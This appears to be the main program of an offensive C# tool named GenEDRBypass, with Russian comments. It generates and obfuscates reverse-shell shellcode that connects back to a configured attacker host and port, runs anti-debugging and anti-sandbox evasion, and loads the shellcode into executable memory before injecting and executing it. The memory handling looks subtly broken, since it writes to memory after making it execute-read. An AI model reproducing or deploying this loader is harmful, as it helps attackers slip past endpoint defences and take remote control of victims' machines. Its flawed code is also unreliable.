using System;
using GenEDRBypass.Core;
using GenEDRBypass.Config;

class Program
{
    static void Main(string[] args)
    {
        string ip = Settings.LHOST; 
        int port = Settings.LPORT;

        Console.WriteLine($"Генерация и обфускация шеллкода для обратного подключения к {ip}:{port}...");

        // Генерируем и обфусцируем шеллкод
        byte[] shellcode = PayloadGenerator.GenerateShellcode(ip, port);
        byte[] obfuscatedShellcode = PayloadGenerator.ObfuscateShellcode(shellcode);

        // Проверки на обход защитных систем
        EvasionTechniques.AntiDebugCheck();
        EvasionTechniques.AntiSandboxChecks();
        EvasionTechniques.ObfuscateExecution();

        // Управление памятью для шеллкода
        IntPtr allocatedMemory = MemoryManager.AllocateExecutableMemory((uint)obfuscatedShellcode.Length);
        System.Runtime.InteropServices.Marshal.Copy(obfuscatedShellcode, 0, allocatedMemory, obfuscatedShellcode.Length);
        MemoryManager.ProtectMemory(allocatedMemory, (uint)obfuscatedShellcode.Length, 0x20);

        // Дешифруем шеллкод перед исполнением
        byte[] deobfuscatedShellcode = PayloadGenerator.DeobfuscateShellcode(obfuscatedShellcode);
        System.Runtime.InteropServices.Marshal.Copy(deobfuscatedShellcode, 0, allocatedMemory, deobfuscatedShellcode.Length);

        // Инъекция и выполнение шеллкода
        ShellInjector.InjectShellcode(allocatedMemory);

        // Освобождаем память после выполнения
        MemoryManager.FreeMemory(allocatedMemory, (uint)obfuscatedShellcode.Length);
        
        Console.WriteLine("Выполнение завершено.");
    }
}
